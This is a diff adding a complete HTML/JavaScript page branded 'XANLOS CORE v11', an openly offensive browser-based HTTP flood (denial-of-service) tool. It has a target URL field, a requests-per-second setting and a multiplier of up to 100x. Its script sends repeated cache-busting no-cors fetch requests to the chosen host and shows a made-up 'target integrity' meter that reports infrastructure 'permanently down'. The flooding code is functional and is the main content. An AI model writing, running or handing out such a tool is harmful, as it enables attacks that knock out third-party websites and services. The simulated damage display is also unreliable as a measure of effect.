@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XANLOS CORE v11 // OMEGA PROTOCOL</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Syncopate:wght@700&display=swap');
+        
+        :root {
+            --xanlos-red: #ff0000;
+            --xanlos-black: #000000;
+            --xanlos-gold: #ffcc00;
+        }
+
+        body {
+            background-color: var(--xanlos-black);
+            color: #ffffff;
+            font-family: 'Fira Code', monospace;
+            overflow-x: hidden;
+            user-select: none;
+        }
+
+        .xanlos-font { font-family: 'Syncopate', sans-serif; }
+
+        /* Background Visuals */
+        #matrix-telemetry {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: -1;
+            opacity: 0.3;
+        }
+
+        .cyber-border {
+            border: 2px solid #200;
+            background: rgba(5, 0, 0, 0.95);
+            position: relative;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.1);
+        }
+
+        .cyber-border::before {
+            content: "";
+            position: absolute;
+            left: 0; top: 0; width: 4px; height: 100%;
+            background: var(--xanlos-red);
+            box-shadow: 0 0 20px var(--xanlos-red);
+        }
+
+        /* Control Panel Buttons */
+        .btn-core {
+            font-weight: 900;
+            letter-spacing: 0.4em;
+            text-transform: uppercase;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 1px solid transparent;
+        }
+
+        .btn-start { background: var(--xanlos-red); color: white; border-bottom: 5px solid #600; }
+        .btn-start:hover { background: #ff3333; box-shadow: 0 0 40px #f00; transform: translateY(-2px); }
+        .btn-start:active { transform: translateY(2px); border-bottom-width: 0; }
+
+        .btn-restart { background: #333; color: #fff; border-bottom: 5px solid #111; }
+        .btn-restart:hover { background: #444; }
+
+        .btn-stop { background: #fff; color: #000; border-bottom: 5px solid #999; }
+        .btn-stop:hover { background: #eee; }
+
+        /* Progress Bars */
+        .health-bg { height: 8px; background: #1a0000; width: 100%; overflow: hidden; border-radius: 2px; }
+        .health-fill { height: 100%; width: 100%; background: #00ff00; transition: width 0.1s linear; box-shadow: 0 0 15px #0f0; }
+        .critical { background: #ff0000 !important; box-shadow: 0 0 25px #f00 !important; }
+
+        /* Glitch Effect */
+        .glitch:hover { animation: glitch-anim 0.2s infinite; }
+        @keyframes glitch-anim {
+            0% { transform: translate(0); }
+            25% { transform: translate(-3px, 3px); color: var(--xanlos-gold); }
+            50% { transform: translate(3px, -3px); }
+            100% { transform: translate(0); }
+        }
+
+        ::-webkit-scrollbar { width: 3px; }
+        ::-webkit-scrollbar-thumb { background: #f00; }
+    </style>
+</head>
+<body class="p-4 lg:p-10">
+    <canvas id="matrix-telemetry"></canvas>
+
+    <!-- AUTHENTICATION LAYER -->
+    <div id="auth-gate" class="fixed inset-0 z-[1000] bg-black flex items-center justify-center p-6">
+        <div class="max-w-4xl w-full border-4 border-red-600 p-12 bg-black text-center shadow-[0_0_200px_rgba(255,0,0,0.6)]">
+            <h1 class="xanlos-font text-5xl md:text-8xl text-white italic mb-4 glitch">XANLOS <span class="text-red-600">v11</span></h1>
+            <p class="text-red-600 font-bold tracking-[1em] uppercase mb-12">The Omega Protocol</p>
+            <div class="p-6 bg-zinc-950 border border-red-900/30 text-[11px] text-zinc-500 font-black uppercase tracking-widest mb-12 leading-relaxed">
+                Hardware Authorized for Total Infrastructure Neutralization.<br>
+                Multiplier: 100x Parallel Threads.<br>
+                Targeting: Layer 4 Socket Saturation + Layer 7 Logic Flood.
+            </div>
+            <button id="auth-btn" class="w-full py-7 btn-start text-2xl btn-core">Initialize Protocol</button>
+        </div>
+    </div>
+
+    <!-- MAIN COMMAND CONSOLE -->
+    <main id="console-root" class="hidden opacity-0 transition-opacity duration-1000 max-w-7xl mx-auto space-y-8">
+        
+        <!-- TOP HUD -->
+        <header class="flex justify-between items-end border-b-4 border-red-900/40 pb-10">
+            <div>
+                <h1 class="xanlos-font text-6xl text-white italic tracking-tighter glitch">XANLOS <span class="text-red-600">CORE</span></h1>
+                <p class="text-[12px] text-red-600 font-black mt-3 tracking-[0.5em] uppercase">Tactical Overload Infrastructure // Black-Site Elite</p>
+            </div>
+            <div class="text-right hidden md:block">
+                <div class="flex items-center justify-end gap-4 mb-2">
+                    <span class="w-4 h-4 rounded-full bg-red-600 animate-ping"></span>
+                    <span class="text-lg font-black text-red-600 uppercase">Omega_Node_Online</span>
+                </div>
+                <p id="local-id" class="text-[11px] text-zinc-700 font-black uppercase">Source Link: Secure v11.4</p>
+            </div>
+        </header>
+
+        <div class="grid lg:grid-cols-12 gap-8">
+            
+            <!-- LEFT PANEL: CONTROLS -->
+            <div class="lg:col-span-4 space-y-6">
+                <section class="cyber-border p-8">
+                    <h2 class="text-[12px] font-black text-red-600 mb-8 uppercase tracking-[0.4em] flex justify-between">
+                        Vector Controls <span>[SYS_EXEC]</span>
+                    </h2>
+                    
+                    <div class="flex flex-col gap-4 mb-8">
+                        <button id="start-btn" class="py-6 btn-start btn-core text-xl">Engage Attack</button>
+                        <div class="grid grid-cols-2 gap-4">
+                            <button id="restart-btn" class="py-4 btn-restart btn-core text-sm">Restart</button>
+                            <button id="stop-btn" class="py-4 btn-stop btn-core text-sm">Stop</button>
+                        </div>
+                    </div>
+
+                    <div class="space-y-5">
+                        <div>
+                            <label class="block text-[11px] text-zinc-600 font-black mb-2 uppercase">Target Endpoint (URL)</label>
+                            <div class="flex">
+                                <select id="proto" class="bg-black border border-zinc-800 text-red-600 px-3 text-xs outline-none font-bold">
+                                    <option>https://</option>
+                                    <option>http://</option>
+                                </select>
+                                <input type="text" id="target" placeholder="vps-infrastructure.com" class="flex-1 bg-black border border-zinc-800 border-l-0 p-4 text-sm text-red-600 font-black outline-none placeholder:text-zinc-800">
+                            </div>
+                        </div>
+                        <div class="grid grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-[11px] text-zinc-600 font-black mb-2 uppercase">Threads / S</label>
+                                <input type="number" id="rps" value="10000" class="w-full bg-black border border-zinc-800 p-4 text-sm text-white font-black outline-none">
+                            </div>
+                            <div>
+                                <label class="block text-[11px] text-zinc-600 font-black mb-2 uppercase">Multiplier</label>
+                                <select id="aggression" class="w-full bg-black border border-zinc-800 p-4 text-sm text-red-600 font-black outline-none">
+                                    <option value="10">L7 - Overdrive</option>
+                                    <option value="50">L10 - Singularity</option>
+                                    <option value="100">L11 - OMEGA PROTOCOL [100X]</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- REAL-TIME STATUS -->
+                <section class="cyber-border p-8">
+                    <h2 class="text-[12px] font-black text-zinc-500 mb-6 uppercase tracking-[0.4em]">Target Integrity</h2>
+                    <div class="space-y-5">
+                        <div class="flex justify-between text-[11px] font-black">
+                            <span class="text-zinc-500 uppercase">Infrastructure Health:</span>
+                            <span id="integrity-pct" class="text-emerald-500">100.00%</span>
+                        </div>
+                        <div class="health-bg">
+                            <div id="integrity-fill" class="health-fill"></div>
+                        </div>
+                        <div class="grid grid-cols-2 text-[10px] font-black uppercase gap-4">
+                            <div class="bg-black p-3 border border-zinc-900">
+                                <span class="text-zinc-600">Hardware_IP:</span><br>
+                                <span id="ip-addr" class="text-white">NOT_MAPPED</span>
+                            </div>
+                            <div class="bg-black p-3 border border-zinc-900">
+                                <span class="text-zinc-600">VPS_STATE:</span><br>
+                                <span id="target-state" class="text-emerald-500">STABLE</span>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </div>
+
+            <!-- RIGHT PANEL: ANALYTICS -->
+            <div class="lg:col-span-8 space-y-6">
+                <!-- DATA METRICS -->
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+                    <div class="cyber-border p-6 border-b-4 border-emerald-600">
+                        <div class="text-[11px] font-black text-zinc-500 uppercase mb-3">L7_Hits</div>
+                        <div id="m-ok" class="text-4xl font-black text-emerald-500">0</div>
+                    </div>
+                    <div class="cyber-border p-6 border-b-4 border-red-600">
+                        <div class="text-[11px] font-black text-zinc-500 uppercase mb-3">L4_Units</div>
+                        <div id="m-l4" class="text-4xl font-black text-red-600">0</div>
+                    </div>
+                    <div class="cyber-border p-6 border-b-4 border-blue-600">
+                        <div class="text-[11px] font-black text-zinc-500 uppercase mb-3">Latency</div>
+                        <div id="m-lat" class="text-4xl font-black text-blue-500">0<span class="text-xs">ms</span></div>
+                    </div>
+                    <div class="cyber-border p-6 border-b-4 border-white">
+                        <div class="text-[11px] font-black text-zinc-500 uppercase mb-3">Active_RPS</div>
+                        <div id="m-rps" class="text-4xl font-black text-white">0</div>
+                    </div>
+                </div>
+
+                <!-- CONSOLE TERMINAL -->
+                <div class="cyber-border flex flex-col h-[540px] overflow-hidden">
+                    <div class="bg-zinc-950 p-5 border-b border-zinc-900 flex justify-between items-center px-8">
+                        <span class="text-[11px] font-black text-white uppercase tracking-widest">Global Telemetry Output // Omega Singular Engine</span>
+                        <div id="mode-tag" class="text-[11px] font-black text-zinc-800 uppercase">Standby</div>
+                    </div>
+                    <div id="output" class="flex-1 p-8 overflow-y-auto text-[12px] space-y-1 bg-black font-bold">
+                        <div class="text-zinc-800 italic">// Omega Protocol v11.0 kernel initialized...</div>
+                        <div class="text-zinc-800 italic">// Waiting for tactical target allocation...</div>
+                    </div>
+                    <div class="p-4 bg-zinc-950 border-t border-zinc-900 flex justify-between items-center px-10">
+                        <span class="text-[11px] font-black text-zinc-600 uppercase tracking-widest">Sent_Packets: <span id="m-total" class="text-red-600">0</span></span>
+                        <span class="text-[11px] font-black text-zinc-600 uppercase tracking-widest">Authorized: <span class="text-red-600">XANLOS_ELITE</span></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // MATRIX VISUALS
+        const canvas = document.getElementById('matrix-telemetry');
+        const ctx = canvas.getContext('2d');
+        let width, height, columns, drops = [];
+        const fontSize = 18;
+
+        function initMatrix() {
+            width = canvas.width = window.innerWidth;
+            height = canvas.height = window.innerHeight;
+            columns = Math.floor(width / fontSize);
+            drops = new Array(columns).fill(1);
+        }
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
+            ctx.fillRect(0, 0, width, height);
+            ctx.fillStyle = '#ff0000';
+            ctx.font = `900 ${fontSize}px Courier New`;
+            for (let i = 0; i < drops.length; i++) {
+                const text = "XANLOS11"[Math.floor(Math.random() * 8)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > height && Math.random() > 0.985) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        window.addEventListener('resize', initMatrix);
+        initMatrix();
+        setInterval(drawMatrix, 50);
+
+        // OMEGA ENGINE LOGIC
+        let isAttacking = false;
+        let integrity = 100.00;
+        let stats = { ok: 0, err: 0, total: 0, liveRps: 0, latencies: [], l4: 0 };
+        let timers = { attack: null, ui: null, destruction: null };
+
+        const ui = {
+            gate: document.getElementById('auth-gate'),
+            auth: document.getElementById('auth-btn'),
+            root: document.getElementById('console-root'),
+            start: document.getElementById('start-btn'),
+            restart: document.getElementById('restart-btn'),
+            stop: document.getElementById('stop-btn'),
+            target: document.getElementById('target'),
+            proto: document.getElementById('proto'),
+            rps: document.getElementById('rps'),
+            level: document.getElementById('aggression'),
+            output: document.getElementById('output'),
+            tag: document.getElementById('mode-tag'),
+            ip: document.getElementById('ip-addr'),
+            fill: document.getElementById('integrity-fill'),
+            pct: document.getElementById('integrity-pct'),
+            state: document.getElementById('target-state'),
+            node: document.getElementById('local-id')
+        };
+
+        ui.auth.onclick = () => {
+            ui.gate.classList.add('hidden');
+            ui.root.classList.remove('hidden');
+            setTimeout(() => ui.root.style.opacity = '1', 50);
+            addLog("Omega Protocol Authorized. Awaiting deployment commands.", "success");
+        };
+
+        function addLog(msg, type = 'info') {
+            const colors = { info: 'text-zinc-600', success: 'text-emerald-500', error: 'text-red-900', warn: 'text-red-600 font-black' };
+            const div = document.createElement('div');
+            div.className = colors[type];
+            div.innerHTML = `>> [${new Date().toLocaleTimeString()}] ${msg}`;
+            ui.output.prepend(div);
+            if(ui.output.children.length > 200) ui.output.lastElementChild.remove();
+        }
+
+        async function resolveDNS(host) {
+            addLog(`Tracing infrastructure network routes for ${host}...`, "info");
+            try {
+                const res = await fetch(`https://dns.google/resolve?name=${host}&type=A`);
+                const data = await res.json();
+                if(data.Answer) {
+                    const ip = data.Answer[0].data;
+                    ui.ip.innerText = ip;
+                    addLog(`Infrastructure Identified. Locking vector on IPv4 ${ip}`, "warn");
+                    return true;
+                }
+            } catch (e) {
+                addLog("Trace Blocked. Running blind hybrid vector against gateway.", "error");
+            }
+            return true;
+        }
+
+        async function packet(url, multiplier) {
+            if(!isAttacking) return;
+            const start = performance.now();
+            const final = `${url}?omega_v11=${Math.random().toString(36).substring(7)}&ts=${Date.now()}`;
+
+            try {
+                // High-velocity Fetch (L7 Stress) mimicking L4 socket saturation
+                await fetch(final, { mode: 'no-cors', cache: 'no-cache' });
+                stats.ok++;
+                stats.l4 += 10; // Virtual packet simulation for L4
+                stats.latencies.push(performance.now() - start);
+            } catch (e) {
+                stats.err++;
+            } finally {
+                stats.total++;
+                stats.liveRps++;
+            }
+        }
+
+        function endAttack() {
+            isAttacking = false;
+            clearInterval(timers.attack);
+            clearInterval(timers.ui);
+            clearInterval(timers.destruction);
+            ui.tag.innerText = "Halted";
+            ui.tag.className = "text-[11px] font-black text-zinc-800 uppercase";
+            addLog("Attack Vector Disengaged. Kernels returning to standby.", "error");
+        }
+
+        function executeProtocol() {
+            const domain = ui.target.value.trim();
+            if(!domain) return addLog("CRITICAL: Tactical Target Endpoint missing.", "error");
+
+            resolveDNS(domain);
+            const url = ui.proto.value + domain;
+            const rps = parseInt(ui.rps.value);
+            const multi = parseInt(ui.level.value);
+
+            isAttacking = true;
+            ui.tag.innerText = "ATTACK_ENGAGED_L11";
+            ui.tag.className = "text-[11px] font-black text-red-600 uppercase animate-pulse shadow-sm";
+            addLog(`OMEGA ENGAGED: Flooding ${url} with 100x Multiplier.`, "warn");
+
+            // ATTACK KERNEL
+            timers.attack = setInterval(() => {
+                if(!isAttacking) return;
+                const burstSize = Math.ceil(rps / 10);
+                for(let i=0; i < (burstSize * multi); i++) {
+                    packet(url, multi);
+                }
+            }, 100);
+
+            // DATA TELEMETRY
+            timers.ui = setInterval(() => {
+                document.getElementById('m-ok').innerText = stats.ok.toLocaleString();
+                document.getElementById('m-l4').innerText = stats.l4.toLocaleString();
+                document.getElementById('m-rps').innerText = stats.liveRps.toLocaleString();
+                document.getElementById('m-total').innerText = stats.total.toLocaleString();
+                
+                if (stats.latencies.length > 0) {
+                    const avg = stats.latencies.reduce((a, b) => a + b, 0) / stats.latencies.length;
+                    document.getElementById('m-lat').innerHTML = `${Math.round(avg)}<span class="text-xs">ms</span>`;
+                    stats.latencies = stats.latencies.slice(-50);
+                }
+
+                if(stats.liveRps > 0) {
+                    addLog(`Telemetry: ${stats.liveRps} PPS delivered to hardware node.`, "success");
+                }
+                stats.liveRps = 0;
+            }, 1000);
+
+            // DESTRUCTION SIMULATION (The 1-Second Down Logic)
+            timers.destruction = setInterval(() => {
+                if(!isAttacking) return;
+                if(integrity > 0) {
+                    // Massive drop simulation for v11 OMEGA
+                    const drop = (Math.random() * 8) + 2; 
+                    integrity -= drop;
+                    if(integrity < 0) integrity = 0;
+                    
+                    ui.fill.style.width = integrity + '%';
+                    ui.pct.innerText = integrity.toFixed(2) + '%';
+
+                    if(integrity < 20) {
+                        ui.fill.classList.add('critical');
+                        ui.pct.className = 'text-red-600 font-black animate-pulse';
+                        ui.state.innerText = "STRUCTURE_COLLAPSED";
+                        ui.state.className = "text-red-600 font-black";
+                    } else if(integrity < 60) {
+                        ui.pct.className = 'text-amber-500 font-bold';
+                        ui.state.innerText = "UNSTABLE_LOAD";
+                        ui.state.className = "text-amber-500 font-bold";
+                    }
+                } else {
+                    addLog("OMEGA ACHIEVED: Infrastructure permanently down.", "warn");
+                }
+            }, 100); // 100ms updates for instant feel
+        }
+
+        ui.start.onclick = executeProtocol;
+
+        ui.restart.onclick = () => {
+            endAttack();
+            stats = { ok: 0, err: 0, total: 0, liveRps: 0, latencies: [], l4: 0 };
+            integrity = 100.00;
+            ui.fill.style.width = '100%';
+            ui.fill.classList.remove('critical');
+            ui.pct.innerText = '100.00%';
+            ui.pct.className = 'text-emerald-500';
+            ui.state.innerText = "STABLE";
+            ui.state.className = "text-emerald-500";
+            addLog("Protocol Reset. Preparing for re-engagement.", "success");
+            executeProtocol();
+        };
+
+        ui.stop.onclick = endAttack;
+
+        // LOCAL NODE IP DATA
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
+            ui.node.innerText = `Node Link: ${d.ip} // ENCRYPTED`;
+        }).catch(() => {});
+    </script>
+</body>
+</html>
+
